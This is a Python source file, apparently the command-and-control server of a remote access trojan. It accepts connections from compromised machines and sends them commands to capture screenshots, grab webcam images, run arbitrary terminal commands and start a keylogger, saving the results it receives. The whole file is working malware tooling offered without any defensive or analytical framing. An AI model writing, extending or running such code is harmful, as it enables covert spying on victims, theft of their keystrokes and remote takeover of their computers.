from textwrap import wrap
from connection import Connector
from host import Host
from threading import Thread
from typing import List, Union
from functools import wraps

def check_connection(method):
    @wraps(method)
    def _impl(*args, **kwargs):
        try:
            return True, method(*args, **kwargs)
        except ConnectionResetError:
            args[0].remove_host(args[1])
            return False, "Error on the host connection"
    return _impl

class Server:

    def __init__(self, host:str, port:int) -> None:
        self.__connector = Connector()
        self.__connector.bind((host, port))
        self.__connector.listen()  # enable connections
        self.__hosts:List[Host] = []
        

    @property
    def hosts(self)->List[Host]:
        return self.__hosts


    @property
    def connector(self)->Connector:
        return self.__connector

    def get_host_by_id(self, id:int)->Union[Host,None]:
        try:
            for host in self.__hosts:
                if host.id == int(id):
                    return host
            return -1
        except:
            return -1

    def remove_host(self, host:Host):
        try:
            self.__hosts.remove(host)
        except ValueError:
            pass
    
    def __establish_connection(self)->None:
        """Add connectios to server
        """
        while True:
            try:
                conn, addr = self.__connector.accept()
                name = self.__connector.get_str(conn=conn)
                self.__hosts.append(Host(len(self.__hosts), conn, addr, name))
                
            except Exception as e:
                if not self.__on:
                    print(">> Server has been disconnected")
                    break
                else:
                    print(str(e))

    def end(self, host:Union[Host,None]=None):
        """Closes all connections"""
        if not host:
            for host in self.__hosts:
                try:
                    self.__connector.send_str("exit", host.sock)
                    host.sock.close()
                except ConnectionResetError:
                    pass
            self.__on = False
            self.__connector.close()
        else:
            self.__connector.send_str("exit", host.sock)
            host.sock.close()
            self.__hosts.remove(host)

    @check_connection
    def screenshot(self, host:Host, name:str):
        self.__connector.send_str("screenshot", host.sock)
        self.__connector.recv_file(name, host.sock)
        print(f"File has been saved as {name}")

    @check_connection
    def camera(self, host:Host, name):
        self.__connector.send_str("camera", host.sock)
        self.__connector.recv_file(name, host.sock)
        print(f"File has been saved as {name}")

    @check_connection
    def execute_in_terminal(self, host:Host, command):
        self.__connector.send_str(command, host.sock)
        result = self.__connector.get_str(host.sock)
        return result

    def start(self):
        """Stablish socket connections
        """
        Thread(target=self.__establish_connection).start()
        self.__on = True
        print(">> Server has been inicialized")

    @check_connection
    def active_keylogger(self, host:Host, time:str):
        self.__connector.send_str("keylogger "+time, host.sock)
        return self.__connector.get_str(host.sock)